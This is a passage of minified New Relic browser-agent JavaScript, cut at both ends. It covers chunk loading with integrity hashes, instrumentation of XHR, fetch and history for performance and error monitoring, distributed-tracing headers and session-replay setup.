o?o(...t):n})}))}(e),(0,n.US)("activatedFeatures",y.B),e.runSoftNavOverSpa&&=!0===p.soft_navigations.enabled&&p.feature_flags.includes("soft_nav")),d.denyList=[...p.ajax.deny_list||[],...p.ajax.block_internal?g:[]],d.ptid=e.agentIdentifier,d.loaderType=r,e.runtime=b(d),E.has(e.agentIdentifier)||(e.ee=R.ee.get(e.agentIdentifier),e.exposed=l,(0,x.W)({agentIdentifier:e.agentIdentifier,drained:!!y.B?.[e.agentIdentifier],type:"lifecycle",name:"initialize",feature:void 0,data:e.config})),E.add(e.agentIdentifier)}},8374:(e,t,r)=>{r.nc=(()=>{try{return document?.currentScript?.nonce}catch(e){}return""})()},860:(e,t,r)=>{"use strict";r.d(t,{$J:()=>d,K7:()=>c,P3:()=>u,XX:()=>i,Yy:()=>s,df:()=>o,qY:()=>n,v4:()=>a});const n="events",i="jserrors",o="browser/blobs",a="rum",s="browser/logs",c={ajax:"ajax",genericEvents:"generic_events",jserrors:i,logging:"logging",metrics:"metrics",pageAction:"page_action",pageViewEvent:"page_view_event",pageViewTiming:"page_view_timing",sessionReplay:"session_replay",sessionTrace:"session_trace",softNav:"soft_navigations",spa:"spa"},u={[c.pageViewEvent]:1,[c.pageViewTiming]:2,[c.metrics]:3,[c.jserrors]:4,[c.spa]:5,[c.ajax]:6,[c.sessionTrace]:7,[c.softNav]:8,[c.sessionReplay]:9,[c.logging]:10,[c.genericEvents]:11},d={[c.pageViewEvent]:a,[c.pageViewTiming]:n,[c.ajax]:n,[c.spa]:n,[c.softNav]:n,[c.metrics]:i,[c.jserrors]:i,[c.sessionTrace]:o,[c.sessionReplay]:o,[c.logging]:s,[c.genericEvents]:"ins"}}},n={};function i(e){var t=n[e];if(void 0!==t)return t.exports;var o=n[e]={exports:{}};return r[e](o,o.exports,i),o.exports}i.m=r,i.d=(e,t)=>{for(var r in t)i.o(t,r)&&!i.o(e,r)&&Object.defineProperty(e,r,{enumerable:!0,get:t[r]})},i.f={},i.e=e=>Promise.all(Object.keys(i.f).reduce(((t,r)=>(i.f[r](e,t),t)),[])),i.u=e=>({212:"nr-spa-compressor",249:"nr-spa-recorder",478:"nr-spa"}[e]+"-1.296.0.min.js"),i.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),e={},t="NRBA-1.296.0.PROD:",i.l=(r,n,o,a)=>{if(e[r])e[r].push(n);else{var s,c;if(void 0!==o)for(var u=document.getElementsByTagName("script"),d=0;d<u.length;d++){var l=u[d];if(l.getAttribute("src")==r||l.getAttribute("data-webpack")==t+o){s=l;break}}if(!s){c=!0;var f={478:"sha512-SHSa/MoRsdpKsVJw/SkOeIpiSP9tn2ptnwUMtl4hYSDZQF7gqduy2X1ui9bws3PKSt4JHZLm5rAHUVHrqxUxSA==",249:"sha512-WqKmCXM77Um14j7xduX/jDJ+vVI2A/EkPn+pw2/wX7Wn4csMd5rgV2GYTKgeUgYxM7IoXjCzskZ8s+7IXoX0WA==",212:"sha512-8wJ3/cphcMIKQc22NiygKRE6n4qYxb3nJ5W5owFYljKB+hj7c5iXuhox6FOT1rOpPb18C7rA58r8WRk9t33pBQ=="};(s=document.createElement("script")).charset="utf-8",s.timeout=120,i.nc&&s.setAttribute("nonce",i.nc),s.setAttribute("data-webpack",t+o),s.src=r,0!==s.src.indexOf(window.location.origin+"/")&&(s.crossOrigin="anonymous"),f[a]&&(s.integrity=f[a])}e[r]=[n];var h=(t,n)=>{s.onerror=s.onload=null,clearTimeout(p);var i=e[r];if(delete e[r],s.parentNode&&s.parentNode.removeChild(s),i&&i.forEach((e=>e(n))),t)return t(n)},p=setTimeout(h.bind(null,void 0,{type:"timeout",target:s}),12e4);s.onerror=h.bind(null,s.onerror),s.onload=h.bind(null,s.onload),c&&document.head.appendChild(s)}},i.r=e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},i.p="https://js-agent.newrelic.com/",(()=>{var e={38:0,788:0};i.f.j=(t,r)=>{var n=i.o(e,t)?e[t]:void 0;if(0!==n)if(n)r.push(n[2]);else{var o=new Promise(((r,i)=>n=e[t]=[r,i]));r.push(n[2]=o);var a=i.p+i.u(t),s=new Error;i.l(a,(r=>{if(i.o(e,t)&&(0!==(n=e[t])&&(e[t]=void 0),n)){var o=r&&("load"===r.type?"missing":r.type),a=r&&r.target&&r.target.src;s.message="Loading chunk "+t+" failed.\n("+o+": "+a+")",s.name="ChunkLoadError",s.type=o,s.request=a,n[1](s)}}),"chunk-"+t,t)}};var t=(t,r)=>{var n,o,[a,s,c]=r,u=0;if(a.some((t=>0!==e[t]))){for(n in s)i.o(s,n)&&(i.m[n]=s[n]);if(c)c(i)}for(t&&t(r);u<a.length;u++)o=a[u],i.o(e,o)&&e[o]&&e[o][0](),e[o]=0},r=self["webpackChunk:NRBA-1.296.0.PROD"]=self["webpackChunk:NRBA-1.296.0.PROD"]||[];r.forEach(t.bind(null,0)),r.push=t.bind(null,r.push.bind(r))})(),(()=>{"use strict";i(8374);var e=i(9566),t=i(1741);class r extends t.W{agentIdentifier=(0,e.LA)(16)}var n=i(860);const o=Object.values(n.K7);var a=i(5205);var s=i(9908),c=i(1863),u=i(4261),d=i(3241),l=i(944),f=i(5701),h=i(8154);function p(e,t,i,o){const a=o||i;!a||a[e]&&a[e]!==r.prototype[e]||(a[e]=function(){(0,s.p)(h.xV,["API/"+e+"/called"],void 0,n.K7.metrics,i.ee),(0,d.W)({agentIdentifier:i.agentIdentifier,drained:!!f.B?.[i.agentIdentifier],type:"data",name:"api",feature:u.Pl+e,data:{}});try{return t.apply(this,arguments)}catch(e){(0,l.R)(23,e)}})}function g(e,t,r,n,i){const o=e.info;null===r?delete o.jsAttributes[t]:o.jsAttributes[t]=r,(i||null===r)&&(0,s.p)(u.Pl+n,[(0,c.t)(),t,r],void 0,"session",e.ee)}var m=i(1687),v=i(4234),b=i(5289),y=i(6154),w=i(5270),R=i(7767),x=i(6389);class T extends v.W{constructor(e,t){super(e.agentIdentifier,t),this.abortHandler=void 0,this.featAggregate=void 0,this.onAggregateImported=void 0,this.deferred=Promise.resolve(),!1===e.init[this.featureName].autoStart?this.deferred=new Promise(((t,r)=>{this.ee.on("manual-start-all",(0,x.J)((()=>{(0,m.Ak)(e.agentIdentifier,this.featureName),t()})))})):(0,m.Ak)(e.agentIdentifier,t)}importAggregator(e,t,r={}){if(this.featAggregate)return;let o;this.onAggregateImported=new Promise((e=>{o=e}));const a=async()=>{let a;await this.deferred;try{if((0,R.V)(e.init)){const{setupAgentSession:t}=await i.e(478).then(i.bind(i,2955));a=t(e)}}catch(e){(0,l.R)(20,e),this.ee.emit("internal-error",[e]),this.featureName===n.K7.sessionReplay&&this.abortHandler?.()}try{if(!this.#t(this.featureName,a,e.init))return(0,m.Ze)(this.agentIdentifier,this.featureName),void o(!1);const{Aggregate:n}=await t();this.featAggregate=new n(e,r),e.runtime.harvester.initializedAggregates.push(this.featAggregate),o(!0)}catch(e){(0,l.R)(34,e),this.abortHandler?.(),(0,m.Ze)(this.agentIdentifier,this.featureName,!0),o(!1),this.ee&&this.ee.abort()}};y.RI?(0,b.GG)((()=>a()),!0):a()}#t(e,t,r){switch(e){case n.K7.sessionReplay:return(0,w.SR)(r)&&!!t;case n.K7.sessionTrace:return!!t;default:return!0}}}var A=i(6630),E=i(2614);class S extends T{static featureName=A.T;constructor(e){var t;super(e,A.T),this.setupInspectionEvents(e.agentIdentifier),t=e,p(u.Fw,(function(e,r){"string"==typeof e&&("/"!==e.charAt(0)&&(e="/"+e),t.runtime.customTransaction=(r||"http://custom.transaction")+e,(0,s.p)(u.Pl+u.Fw,[(0,c.t)()],void 0,void 0,t.ee))}),t),this.ee.on("api-send-rum",((e,t)=>(0,s.p)("send-rum",[e,t],void 0,this.featureName,this.ee))),this.importAggregator(e,(()=>i.e(478).then(i.bind(i,1983))))}setupInspectionEvents(e){const t=(t,r)=>{t&&(0,d.W)({agentIdentifier:e,timeStamp:t.timeStamp,loaded:"complete"===t.target.readyState,type:"window",name:r,data:t.target.location+""})};(0,b.sB)((e=>{t(e,"DOMContentLoaded")})),(0,b.GG)((e=>{t(e,"load")})),(0,b.Qr)((e=>{t(e,"navigate")})),this.ee.on(E.tS.UPDATE,((t,r)=>{(0,d.W)({agentIdentifier:e,type:"lifecycle",name:"session",data:r})}))}}var _=i(384);var N=i(2843),O=i(3878),I=i(782);class P extends T{static featureName=I.T;constructor(e){super(e,I.T),y.RI&&((0,N.u)((()=>(0,s.p)("docHidden",[(0,c.t)()],void 0,I.T,this.ee)),!0),(0,O.sp)("pagehide",(()=>(0,s.p)("winPagehide",[(0,c.t)()],void 0,I.T,this.ee))),this.importAggregator(e,(()=>i.e(478).then(i.bind(i,9917)))))}}class j extends T{static featureName=h.TZ;constructor(e){super(e,h.TZ),y.RI&&document.addEventListener("securitypolicyviolation",(e=>{(0,s.p)(h.xV,["Generic/CSPViolation/Detected"],void 0,this.featureName,this.ee)})),this.importAggregator(e,(()=>i.e(478).then(i.bind(i,8351))))}}var k=i(6774),C=i(3304);class L{constructor(e,t,r,n,i){this.name="UncaughtError",this.message="string"==typeof e?e:(0,C.A)(e),this.sourceURL=t,this.line=r,this.column=n,this.__newrelic=i}}function M(e){return K(e)?e:new L(void 0!==e?.message?e.message:e,e?.filename||e?.sourceURL,e?.lineno||e?.line,e?.colno||e?.col,e?.__newrelic,e?.cause)}function H(e){const t="Unhandled Promise Rejection: ";if(!e?.reason)return;if(K(e.reason)){try{e.reason.message.startsWith(t)||(e.reason.message=t+e.reason.message)}catch(e){}return M(e.reason)}const r=M(e.reason);return(r.message||"").startsWith(t)||(r.message=t+r.message),r}function D(e){if(e.error instanceof SyntaxError&&!/:\d+$/.test(e.error.stack?.trim())){const t=new L(e.message,e.filename,e.lineno,e.colno,e.error.__newrelic,e.cause);return t.name=SyntaxError.name,t}return K(e.error)?e.error:M(e)}function K(e){return e instanceof Error&&!!e.stack}function U(e,t,r,i,o=(0,c.t)()){"string"==typeof e&&(e=new Error(e)),(0,s.p)("err",[e,o,!1,t,r.runtime.isRecording,void 0,i],void 0,n.K7.jserrors,r.ee)}var F=i(3496),W=i(993),B=i(3785);function G(e,{customAttributes:t={},level:r=W.p_.INFO}={},n,i,o=(0,c.t)()){(0,B.R)(n.ee,e,t,r,i,o)}function V(e,t,r,i,o=(0,c.t)()){(0,s.p)(u.Pl+u.hG,[o,e,t,i],void 0,n.K7.genericEvents,r.ee)}function z(e){p(u.eY,(function(t){return function(e,t){const r={};let i,o;(0,l.R)(54,"newrelic.register"),e.init.api.allow_registered_children||(i=()=>(0,l.R)(55));t&&(0,F.I)(t)||(i=()=>(0,l.R)(48,t));const a={addPageAction:(n,i={})=>{u(V,[n,{...r,...i},e],t)},log:(n,i={})=>{u(G,[n,{...i,customAttributes:{...r,...i.customAttributes||{}}},e],t)},noticeError:(n,i={})=>{u(U,[n,{...r,...i},e],t)},setApplicationVersion:e=>{r["application.version"]=e},setCustomAttribute:(e,t)=>{r[e]=t},setUserId:e=>{r["enduser.id"]=e},metadata:{customAttributes:r,target:t,get connected(){return o||Promise.reject(new Error("Failed to connect"))}}};i?i():o=new Promise(((n,i)=>{try{const o=e.runtime?.entityManager;let s=!!o?.get().entityGuid,c=o?.getEntityGuidFor(t.licenseKey,t.applicationID),u=!!c;if(s&&u)t.entityGuid=c,n(a);else{const d=setTimeout((()=>i(new Error("Failed to connect - Timeout"))),15e3);function l(r){(0,F.A)(r,e)?s||=!0:t.licenseKey===r.licenseKey&&t.applicationID===r.applicationID&&(u=!0,t.entityGuid=r.entityGuid),s&&u&&(clearTimeout(d),e.ee.removeEventListener("entity-added",l),n(a))}e.ee.emit("api-send-rum",[r,t]),e.ee.on("entity-added",l)}}catch(f){i(f)}}));const u=async(t,r,a)=>{if(i)return i();const u=(0,c.t)();(0,s.p)(h.xV,["API/register/".concat(t.name,"/called")],void 0,n.K7.metrics,e.ee);try{await o;const n=e.init.api.duplicate_registered_data;(!0===n||Array.isArray(n)&&n.includes(a.entityGuid))&&t(...r,void 0,u),t(...r,a.entityGuid,u)}catch(e){(0,l.R)(50,e)}};return a}(e,t)}),e)}class Z extends T{static featureName=k.T;constructor(e){var t;super(e,k.T),t=e,p(u.o5,((e,r)=>U(e,r,t)),t),function(e){p(u.bt,(function(t){e.runtime.onerror=t}),e)}(e),function(e){let t=0;p(u.k6,(function(e,r){++t>10||(this.runtime.releaseIds[e.slice(-200)]=(""+r).slice(-200))}),e)}(e),z(e);try{this.removeOnAbort=new AbortController}catch(e){}this.ee.on("internal-error",((t,r)=>{this.abortHandler&&(0,s.p)("ierr",[M(t),(0,c.t)(),!0,{},e.runtime.isRecording,r],void 0,this.featureName,this.ee)})),y.gm.addEventListener("unhandledrejection",(t=>{this.abortHandler&&(0,s.p)("err",[H(t),(0,c.t)(),!1,{unhandledPromiseRejection:1},e.runtime.isRecording],void 0,this.featureName,this.ee)}),(0,O.jT)(!1,this.removeOnAbort?.signal)),y.gm.addEventListener("error",(t=>{this.abortHandler&&(0,s.p)("err",[D(t),(0,c.t)(),!1,{},e.runtime.isRecording],void 0,this.featureName,this.ee)}),(0,O.jT)(!1,this.removeOnAbort?.signal)),this.abortHandler=this.#r,this.importAggregator(e,(()=>i.e(478).then(i.bind(i,2176))))}#r(){this.removeOnAbort?.abort(),this.abortHandler=void 0}}var q=i(8990);let X=1;function Y(e){const t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===y.gm?0:(0,q.I)(e,"nr@id",(function(){return X++}))}function J(e){if("string"==typeof e&&e.length)return e.length;if("object"==typeof e){if("undefined"!=typeof ArrayBuffer&&e instanceof ArrayBuffer&&e.byteLength)return e.byteLength;if("undefined"!=typeof Blob&&e instanceof Blob&&e.size)return e.size;if(!("undefined"!=typeof FormData&&e instanceof FormData))try{return(0,C.A)(e).length}catch(e){return}}}var Q=i(8139),ee=i(7836),te=i(3434);const re={},ne=["open","send"];function ie(e){var t=e||ee.ee;const r=function(e){return(e||ee.ee).get("xhr")}(t);if(void 0===y.gm.XMLHttpRequest)return r;if(re[r.debugId]++)return r;re[r.debugId]=1,(0,Q.u)(t);var n=(0,te.YM)(r),i=y.gm.XMLHttpRequest,o=y.gm.MutationObserver,a=y.gm.Promise,s=y.gm.setInterval,c="readystatechange",u=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],d=[],f=y.gm.XMLHttpRequest=function(e){const t=new i(e),o=r.context(t);try{r.emit("new-xhr",[t],o),t.addEventListener(c,(a=o,function(){var e=this;e.readyState>3&&!a.resolved&&(a.resolved=!0,r.emit("xhr-resolved",[],e)),n.inPlace(e,u,"fn-",b)}),(0,O.jT)(!1))}catch(e){(0,l.R)(15,e);try{r.emit("internal-error",[e])}catch(e){}}var a;return t};function h(e,t){n.inPlace(t,["onreadystatechange"],"fn-",b)}if(function(e,t){for(var r in e)t[r]=e[r]}(i,f),f.prototype=i.prototype,n.inPlace(f.prototype,ne,"-xhr-",b),r.on("send-xhr-start",(function(e,t){h(e,t),function(e){d.push(e),o&&(p?p.then(v):s?s(v):(g=-g,m.data=g))}(t)})),r.on("open-xhr-start",h),o){var p=a&&a.resolve();if(!s&&!a){var g=1,m=document.createTextNode(g);new o(v).observe(m,{characterData:!0})}}else t.on("fn-end",(function(e){e[0]&&e[0].type===c||v()}));function v(){for(var e=0;e<d.length;e++)h(0,d[e]);d.length&&(d=[])}function b(e,t){return t}return r}var oe="fetch-",ae=oe+"body-",se=["arrayBuffer","blob","json","text","formData"],ce=y.gm.Request,ue=y.gm.Response,de="prototype";const le={};function fe(e){const t=function(e){return(e||ee.ee).get("fetch")}(e);if(!(ce&&ue&&y.gm.fetch))return t;if(le[t.debugId]++)return t;function r(e,r,n){var i=e[r];"function"==typeof i&&(e[r]=function(){var e,r=[...arguments],o={};t.emit(n+"before-start",[r],o),o[ee.P]&&o[ee.P].dt&&(e=o[ee.P].dt);var a=i.apply(this,r);return t.emit(n+"start",[r,e],a),a.then((function(e){return t.emit(n+"end",[null,e],a),e}),(function(e){throw t.emit(n+"end",[e],a),e}))})}return le[t.debugId]=1,se.forEach((e=>{r(ce[de],e,ae),r(ue[de],e,ae)})),r(y.gm,"fetch",oe),t.on(oe+"end",(function(e,r){var n=this;if(r){var i=r.headers.get("content-length");null!==i&&(n.rxSize=i),t.emit(oe+"done",[null,r],n)}else t.emit(oe+"done",[e],n)})),t}var he=i(7485);class pe{constructor(e){this.agentRef=e}generateTracePayload(t){const r=this.agentRef.loader_config;if(!this.shouldGenerateTrace(t)||!r)return null;var n=(r.accountID||"").toString()||null,i=(r.agentID||"").toString()||null,o=(r.trustKey||"").toString()||null;if(!n||!i)return null;var a=(0,e.ZF)(),s=(0,e.el)(),c=Date.now(),u={spanId:a,traceId:s,timestamp:c};return(t.sameOrigin||this.isAllowedOrigin(t)&&this.useTraceContextHeadersForCors())&&(u.traceContextParentHeader=this.generateTraceContextParentHeader(a,s),u.traceContextStateHeader=this.generateTraceContextStateHeader(a,c,n,i,o)),(t.sameOrigin&&!this.excludeNewrelicHeader()||!t.sameOrigin&&this.isAllowedOrigin(t)&&this.useNewrelicHeaderForCors())&&(u.newrelicHeader=this.generateTraceHeader(a,s,c,n,i,o)),u}generateTraceContextParentHeader(e,t){return"00-"+t+"-"+e+"-01"}generateTraceContextStateHeader(e,t,r,n,i){return i+"@nr=0-1-"+r+"-"+n+"-"+e+"----"+t}generateTraceHeader(e,t,r,n,i,o){if(!("function"==typeof y.gm?.btoa))return null;var a={v:[0,1],d:{ty:"Browser",ac:n,ap:i,id:e,tr:t,ti:r}};return o&&n!==o&&(a.d.tk=o),btoa((0,C.A)(a))}shouldGenerateTrace(e){return this.agentRef.init?.distributed_tracing?.enabled&&this.isAllowedOrigin(e)}isAllowedOrigin(e){var t=!1;const r=this.agentRef.init?.distributed_tracing;if(e.sameOrigin)t=!0;else if(r?.allowed_origins instanceof Array)for(var n=0;n<r.allowed_origins.length;n++){var i=(0,he.D)(r.allowed_origins[n]);if(e.hostname===i.hostname&&e.protocol===i.protocol&&e.port===i.port){t=!0;break}}return t}excludeNewrelicHeader(){var e=this.agentRef.init?.distributed_tracing;return!!e&&!!e.exclude_newrelic_header}useNewrelicHeaderForCors(){var e=this.agentRef.init?.distributed_tracing;return!!e&&!1!==e.cors_use_newrelic_header}useTraceContextHeadersForCors(){var e=this.agentRef.init?.distributed_tracing;return!!e&&!!e.cors_use_tracecontext_headers}}var ge=i(9300),me=i(7295),ve=["load","error","abort","timeout"],be=ve.length,ye=(0,_.dV)().o.REQ,we=(0,_.dV)().o.XHR;const Re="X-NewRelic-App-Data";class xe extends T{static featureName=ge.T;constructor(e){super(e,ge.T),this.dt=new pe(e),this.handler=(e,t,r,n)=>(0,s.p)(e,t,r,n,this.ee);try{const e={xmlhttprequest:"xhr",fetch:"fetch",beacon:"beacon"};y.gm?.performance?.getEntriesByType("resource").forEach((t=>{if(t.initiatorType in e&&0!==t.responseStatus){const r={status:t.responseStatus},i={rxSize:t.transferSize,duration:Math.floor(t.duration),cbTime:0};Te(r,t.name),this.handler("xhr",[r,i,t.startTime,t.responseEnd,e[t.initiatorType]],void 0,n.K7.ajax)}}))}catch(e){}fe(this.ee),ie(this.ee),function(e,t,r,i){function o(e){var t=this;t.totalCbs=0,t.called=0,t.cbTime=0,t.end=A,t.ended=!1,t.xhrGuids={},t.lastSize=null,t.loadCaptureCalled=!1,t.params=this.params||{},t.metrics=this.metrics||{},e.addEventListener("load",(function(r){E(t,e)}),(0,O.jT)(!1)),y.lR||e.addEventListener("progress",(function(e){t.lastSize=e.loaded}),(0,O.jT)(!1))}function a(e){this.params={method:e[0]},Te(this,e[1]),this.metrics={}}function u(t,r){e.loader_config.xpid&&this.sameOrigin&&r.setRequestHeader("X-NewRelic-ID",e.loader_config.xpid);var n=i.generateTracePayload(this.parsedOrigin);if(n){var o=!1;n.newrelicHeader&&(r.setRequestHeader("newrelic",n.newrelicHeader),o=!0),n.traceContextParentHeader&&(r.setRequestHeader("traceparent",n.traceContextParentHeader),n.traceContextStateHeader&&r.setRequestHeader("tracestate",n.traceContextStateHeader),o=!0),o&&(this.dt=n)}}function d(e,r){var n=this.metrics,i=e[0],o=this;if(n&&i){var a=J(i);a&&(n.txSize=a)}this.startTime=(0,c.t)(),this.body=i,this.listener=function(e){try{"abort"!==e.type||o.loadCaptureCalled||(o.params.aborted=!0),("load"!==e.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof r.onload)&&"function"==typeof o.end)&&o.end(r)}catch(e){try{t.emit("internal-error",[e])}catch(e){}}};for(var s=0;s<be;s++)r.addEventListener(ve[s],this.listener,(0,O.jT)(!1))}function l(e,t,r){this.cbTime+=e,t?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof r.onload||"function"!=typeof this.end||this.end(r)}function f(e,t){var r=""+Y(e)+!!t;this.xhrGuids&&!this.xhrGuids[r]&&(this.xhrGuids[r]=!0,this.totalCbs+=1)}function p(e,t){var r=""+Y(e)+!!t;this.xhrGuids&&this.xhrGuids[r]&&(delete this.xhrGuids[r],this.totalCbs-=1)}function g(){this.endTime=(0,c.t)()}function m(e,r){r instanceof we&&"load"===e[0]&&t.emit("xhr-load-added",[e[1],e[2]],r)}function v(e,r){r instanceof we&&"load"===e[0]&&t.emit("xhr-load-removed",[e[1],e[2]],r)}function b(e,t,r){t instanceof we&&("onload"===r&&(this.onload=!0),("load"===(e[0]&&e[0].type)||this.onload)&&(this.xhrCbStart=(0,c.t)()))}function w(e,r){this.xhrCbStart&&t.emit("xhr-cb-time",[(0,c.t)()-this.xhrCbStart,this.onload,r],r)}function R(e){var t,r=e[1]||{};if("string"==typeof e[0]?0===(t=e[0]).length&&y.RI&&(t=""+y.gm.location.href):e[0]&&e[0].url?t=e[0].url:y.gm?.URL&&e[0]&&e[0]instanceof URL?t=e[0].href:"function"==typeof e[0].toString&&(t=e[0].toString()),"string"==typeof t&&0!==t.length){t&&(this.parsedOrigin=(0,he.D)(t),this.sameOrigin=this.parsedOrigin.sameOrigin);var n=i.generateTracePayload(this.parsedOrigin);if(n&&(n.newrelicHeader||n.traceContextParentHeader))if(e[0]&&e[0].headers)s(e[0].headers,n)&&(this.dt=n);else{var o={};for(var a in r)o[a]=r[a];o.headers=new Headers(r.headers||{}),s(o.headers,n)&&(this.dt=n),e.length>1?e[1]=o:e.push(o)}}function s(e,t){var r=!1;return t.newrelicHeader&&(e.set("newrelic",t.newrelicHeader),r=!0),t.traceContextParentHeader&&(e.set("traceparent",t.traceContextParentHeader),t.traceContextStateHeader&&e.set("tracestate",t.traceContextStateHeader),r=!0),r}}function x(e,t){this.params={},this.metrics={},this.startTime=(0,c.t)(),this.dt=t,e.length>=1&&(this.target=e[0]),e.length>=2&&(this.opts=e[1]);var r,n=this.opts||{},i=this.target;"string"==typeof i?r=i:"object"==typeof i&&i instanceof ye?r=i.url:y.gm?.URL&&"object"==typeof i&&i instanceof URL&&(r=i.href),Te(this,r);var o=(""+(i&&i instanceof ye&&i.method||n.method||"GET")).toUpperCase();this.params.method=o,this.body=n.body,this.txSize=J(n.body)||0}function T(e,t){if(this.endTime=(0,c.t)(),this.params||(this.params={}),(0,me.iW)(this.params))return;let i;this.params.status=t?t.status:0,"string"==typeof this.rxSize&&this.rxSize.length>0&&(i=+this.rxSize);const o={txSize:this.txSize,rxSize:i,duration:(0,c.t)()-this.startTime};r("xhr",[this.params,o,this.startTime,this.endTime,"fetch"],this,n.K7.ajax)}function A(e){const t=this.params,i=this.metrics;if(!this.ended){this.ended=!0;for(let t=0;t<be;t++)e.removeEventListener(ve[t],this.listener,!1);t.aborted||(0,me.iW)(t)||(i.duration=(0,c.t)()-this.startTime,this.loadCaptureCalled||4!==e.readyState?null==t.status&&(t.status=0):E(this,e),i.cbTime=this.cbTime,r("xhr",[t,i,this.startTime,this.endTime,"xhr"],this,n.K7.ajax))}}function E(e,r){e.params.status=r.status;var i=function(e,t){var r=e.responseType;return"json"===r&&null!==t?t:"arraybuffer"===r||"blob"===r||"json"===r?J(e.response):"text"===r||""===r||void 0===r?J(e.responseText):void 0}(r,e.lastSize);if(i&&(e.metrics.rxSize=i),e.sameOrigin&&r.getAllResponseHeaders().indexOf(Re)>=0){var o=r.getResponseHeader(Re);o&&((0,s.p)(h.rs,["Ajax/CrossApplicationTracing/Header/Seen"],void 0,n.K7.metrics,t),e.params.cat=o.split(", ").pop())}e.loadCaptureCalled=!0}t.on("new-xhr",o),t.on("open-xhr-start",a),t.on("open-xhr-end",u),t.on("send-xhr-start",d),t.on("xhr-cb-time",l),t.on("xhr-load-added",f),t.on("xhr-load-removed",p),t.on("xhr-resolved",g),t.on("addEventListener-end",m),t.on("removeEventListener-end",v),t.on("fn-end",w),t.on("fetch-before-start",R),t.on("fetch-start",x),t.on("fn-start",b),t.on("fetch-done",T)}(e,this.ee,this.handler,this.dt),this.importAggregator(e,(()=>i.e(478).then(i.bind(i,3845))))}}function Te(e,t){var r=(0,he.D)(t),n=e.params||e;n.hostname=r.hostname,n.port=r.port,n.protocol=r.protocol,n.host=r.hostname+":"+r.port,n.pathname=r.pathname,e.parsedOrigin=r,e.sameOrigin=r.sameOrigin}const Ae={},Ee=["pushState","replaceState"];function Se(e){const t=function(e){return(e||ee.ee).get("history")}(e);return!y.RI||Ae[t.debugId]++||(Ae[t.debugId]=1,(0,te.YM)(t).inPlace(window.history,Ee,"-")),t}var _e=i(3738);function Ne(e){p(u.BL,(function(t=Date.now()){const r=t-y.WN;r<0&&(0,l.R)(62,t),(0,s.p)(h.XG,[u.BL,{time:r}],void 0,n.K7.metrics,e.ee),e.addToTrace({name:u.BL,start:t,origin:"nr"}),(0,s.p)(u.Pl+u.hG,[r,u.BL],void 0,n.K7.genericEvents,e.ee)}),e)}const{He:Oe,bD:Ie,d3:Pe,Kp:je,TZ:ke,Lc:Ce,uP:Le,Rz:Me}=_e;class He extends T{static featureName=ke;constructor(e){var t;super(e,ke),t=e,p(u.U2,(function(e){if(!(e&&"object"==typeof e&&e.name&&e.start))return;const r={n:e.name,s:e.start-y.WN,e:(e.end||e.start)-y.WN,o:e.origin||"",t:"api"};r.s<0||r.e<0||r.e<r.s?(0,l.R)(61,{start:r.s,end:r.e}):(0,s.p)("bstApi",[r],void 0,n.K7.sessionTrace,t.ee)}),t),Ne(e);if(!(0,R.V)(e.init))return void this.deregisterDrain();const r=this.ee;let o;Se(r),this.eventsEE=(0,Q.u)(r),this.eventsEE.on(Le,(function(e,t){this.bstStart=(0,c.t)()})),this.eventsEE.on(Ce,(function(e,t){(0,s.p)("bst",[e[0],t,this.bstStart,(0,c.t)()],void 0,n.K7.sessionTrace,r)})),r.on(Me+Pe,(function(e){this.time=(0,c.t)(),this.startPath=location.pathname+location.hash})),r.on(Me+je,(function(e){(0,s.p)("bstHist",[location.pathname+location.hash,this.startPath,this.time],void 0,n.K7.sessionTrace,r)}));try{o=new PerformanceObserver((e=>{const t=e.getEntries();(0,s.p)(Oe,[t],void 0,n.K7.sessionTrace,r)})),o.observe({type:Ie,buffered:!0})}catch(e){}this.importAggregator(e,(()=>i.e(478).then(i.bind(i,6974))),{resourceObserver:o})}}var De=i(6344);class Ke extends T{static featureName=De.TZ;#n;#i;constructor(e){var t;let r;super(e,De.TZ),t=e,p(u.CH,(function(){(0,s.p)(u.CH,[],void 0,n.K7.sessionReplay,t.ee)}),t),function(e){p(u.Tb,(function(){(0,s.p)(u.Tb,[],void 0,n.K7.sessionReplay,e.ee)}),e)}(e),this.#i=e;try{r=JSON.parse(localStorage.getItem("".concat(E.H3,"_").concat(E.uh)))}catch(e){}(0,w.SR)(e.init)&&this.ee.on(De.G4.RECORD,(()=>this.#o())),this.#a(r)?(this.#n=r?.sessionReplayMode,this.#s()):this.importAggregator(this.#i,(()=>i.e(478).then(i.bind(i,6167)))),this.ee.on("err",(e=>{this.#i.runtime.isRecording&&(this.errorNoticed=!0,(0,s.p)(De.G4.ERROR_DURING_REPLAY,[e],void 0,this.featureName,this.ee))}))}#a(e){return e&&(e.sessionReplayMode===E.g.FULL||e.sessionReplayMode===E.g.ERROR)||(0,w.Aw)(this.#i.init)}#c=!1;async#s(e){if(!this.#c){this.#c=!0;try{const{Recorder:t}=await Promise.all([i.e(478),i.e(249)]).then(i.bind(i,8589));this.recorder??=new t({mode:this.#n,agentIdentifier:this.agentIdentifier,trigger:e,ee:this.ee,agentRef:this.#i}),this.recorder.startRecording(),this.abortHandler=this.recorder.stopRecording}catch(e){this.parent.ee.emit("internal-error",[e])}this.importAggregator(this.#i,(()=>i.e(478).then(i.bind(i,6167))),{recorder:this.recorder,errorNoticed:this.errorNoticed})}}#o(){this.featAggregate?this.featAggregate.mode!==E.g.FULL&&this.featAggregate.initializeRecording(E.g.FULL,!0):(this.#n=E.g.FULL,this.#s(De.Qb.API),this.recorder&&this.recorder.parent.mode!==E.g.FULL&&(this.recorder.parent.mode=E.g.FULL,this.recorder.stopRecording(),this.recorder.startRecording(),this.abortHandler=this.recorder.stopRecording))}}var Ue=i(3962);function Fe(e){const t=e.ee.get("tracer");function r(){}p(u.dT,(function(e){return(new r).get("object"==typeof e?e:{})}),e);const i=r.prototype={createTracer:function(r,i){var o={},a=this,d="function"==typeof i;return(0,s.p)(h.xV,["API/createTracer/called"],void 0,n.K7.metrics,e.ee),e.runSoftNavOverSpa||(0,s.p)(u.hw+"tracer",[(0,c.t)(),r,o],a,n.K7.spa,e.ee),function(){if(t.emit((d?"":"no-")+"fn-start",[(0,c.t)(),a,d],o),d)try{return i.apply(this,arguments)}catch(e){const 